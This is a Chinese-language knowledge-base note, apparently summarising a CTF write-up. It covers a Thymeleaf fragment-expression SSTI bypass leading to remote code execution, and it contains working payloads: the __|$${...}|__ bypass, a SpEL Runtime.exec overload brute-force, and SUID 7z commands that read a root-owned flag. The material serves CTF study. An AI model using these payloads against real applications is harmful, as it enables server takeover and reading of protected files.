---
title: "Thymeleaf SSTI Fragment Expression 绕过"
category: web
tags: [ssti, thymeleaf, java, template-injection, fragment-expression, 模板注入]
triggers: [thymeleaf, fragment expression, __|
created: 2026-06-08
updated: 2026-06-08
sources: [raw/2026 软件系统安全赛 初赛 wp.md]
---

# Thymeleaf SSTI Fragment Expression 绕过

## Summary

Thymeleaf 中 `::` 操作符触发 fragment expression 解析。在高版本 Thymeleaf 中 `${...}` 被拦截时，可通过预处理字面量拼接 `__|$${...}|__::.x` 绕过实现 SSTI → RCE。配合 SUID 7z 可读取 root 属主的 `/flag`。

## Key Points

- 控制器中 `return "admin :: " + section` 将用户输入拼入 `::` 语句，触发 fragment expression
- 高版本 Thymeleaf 拦截 `${...}` 直接表达式
- `__|$${...}|__::.x` 使用预处理字面量拼接绕过
- JDK 不同版本 `Runtime.exec` 重载顺序不同，需爆破找出可用下标
- 7z 的 `a -ttar -an -so` 可将文件内容输出到 stdout

## Thymeleaf SSTI 绕过

```
# 直接写法被拦截：
${7*7}

# 绕过写法：
__|$${7*7}|__::.x
```

## Runtime.exec 重载爆破

```java
rt = "''.getClass().forName('java.lang.Runtime').getMethods.?[name=='getRuntime'][0].invoke(null)"
expr = f"{rt}.getClass.getMethods.?[name=='exec'][{idx}].invoke({rt},'/usr/bin/id')"
```

不同 JDK 版本中 `Runtime.exec` 的重载顺序可能不同，需遍历 `idx` 找到匹配 `(String)` 或 `(String[])` 的重载。

## 7z SUID 提权

```bash
find / -perm -4000 -type f  # 发现 /usr/bin/7z 有 SUID
/usr/bin/7z a -ttar -an -so /flag  # 将 flag 打包为 tar 流输出到 stdout
```

- `-ttar`: 使用 tar 格式
- `-an`: 不存档名（禁止询问）
- `-so`: 输出到 stdout

## Connections

- Related: [[web/flask-ssti-session-forgery]], [[web/prng-state-recovery]]
- Source: [[ctf/2026-software-security-competition-qualifier]]
